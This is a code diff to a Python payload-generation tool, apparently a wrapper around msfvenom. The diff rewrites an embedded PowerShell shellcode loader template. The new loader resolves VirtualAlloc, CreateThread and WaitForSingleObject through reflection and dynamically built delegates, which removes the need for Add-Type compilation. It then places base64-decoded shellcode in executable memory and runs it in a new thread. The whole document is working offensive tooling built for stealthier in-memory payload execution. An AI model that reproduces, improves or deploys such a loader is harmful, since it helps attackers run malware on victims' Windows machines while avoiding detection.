@@ -399,48 +399,66 @@ def build_command(
 
 PS1_WRAPPER = """\
 # MSFVenomGen - PowerShell shellcode loader
-# Generated shellcode runner using VirtualAlloc + CreateThread
 
-$sc = [Convert]::FromBase64String('{b64}')
+$sc = [Convert]::FromBase64String('__B64__')
 
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class ShellcodeRunner {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
-        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-    [DllImport("kernel32.dll")]
-    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-
-    [DllImport("kernel32.dll")]
-    public static extern int GetLastError();
-
-    public static void Run(byte[] sc) {
-        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
-        if (addr == IntPtr.Zero) {
-            throw new Exception("VirtualAlloc failed. Error: " + GetLastError());
-        }
-        Marshal.Copy(sc, 0, addr, sc.Length);
-        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-        if (thread == IntPtr.Zero) {
-            throw new Exception("CreateThread failed. Error: " + GetLastError());
-        }
-        WaitForSingleObject(thread, 0xFFFFFFFF);
-    }
+# Resolve a function address from a loaded DLL via reflection (no Add-Type / C# compiler needed)
+function Get-ProcAddress {
+    param([string]$Module, [string]$Procedure)
+    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' }
+    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+    $GetProcAddress  = $UnsafeNativeMethods.GetMethod('GetProcAddress',
+        [reflection.bindingflags]'Public,Static', $null,
+        [System.Reflection.CallingConventions]::Any,
+        @([System.Runtime.InteropServices.HandleRef], [string]), $null)
+    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+    $tmpPtr    = New-Object IntPtr
+    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
 }
-"@
 
-try {
-    [ShellcodeRunner]::Run($sc)
-} catch {
-    Write-Error $_
-    Read-Host "Press Enter to exit"
+function Get-DelegateType {
+    param([Type[]]$Parameters, [Type]$ReturnType = [Void])
+    $Domain          = [AppDomain]::CurrentDomain
+    $DynAssembly     = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+    $TypeBuilder     = $ModuleBuilder.DefineType('MyDelegateType', 'Class,Public,Sealed,AnsiClass,AutoClass',
+                           [System.MulticastDelegate])
+    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName,HideBySig,Public',
+                              [System.Reflection.CallingConventions]::Standard, $Parameters)
+    $ConstructorBuilder.SetImplementationFlags('Runtime,Managed')
+    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public,HideBySig,NewSlot,Virtual', $ReturnType, $Parameters)
+    $MethodBuilder.SetImplementationFlags('Runtime,Managed')
+    return $TypeBuilder.CreateType()
 }
+
+$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
+$VirtualAllocDelegate = Get-DelegateType @([IntPtr],[UInt32],[UInt32],[UInt32]) ([IntPtr])
+$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    $VirtualAllocAddr, $VirtualAllocDelegate)
+
+$CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
+$CreateThreadDelegate = Get-DelegateType @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr]) ([IntPtr])
+$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    $CreateThreadAddr, $CreateThreadDelegate)
+
+$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
+$WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr],[Int32]) ([Int32])
+$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    $WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
+
+$addr = $VirtualAlloc.Invoke([IntPtr]::Zero, $sc.Length, 0x3000, 0x40)
+if ($addr -eq [IntPtr]::Zero) { throw "VirtualAlloc failed" }
+
+[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)
+
+$thread = $CreateThread.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+if ($thread -eq [IntPtr]::Zero) { throw "CreateThread failed" }
+
+$WaitForSingleObject.Invoke($thread, 0xFFFFFFFF) | Out-Null
 """
 
 
@@ -459,7 +477,7 @@ def wrap_ps1(raw_path: str, out_path: str) -> bool:
 
     import base64
     b64 = base64.b64encode(shellcode).decode()
-    ps1 = PS1_WRAPPER.replace("{b64}", b64)
+    ps1 = PS1_WRAPPER.replace("__B64__", b64)
 
     try:
         with open(out_path, "w") as f:
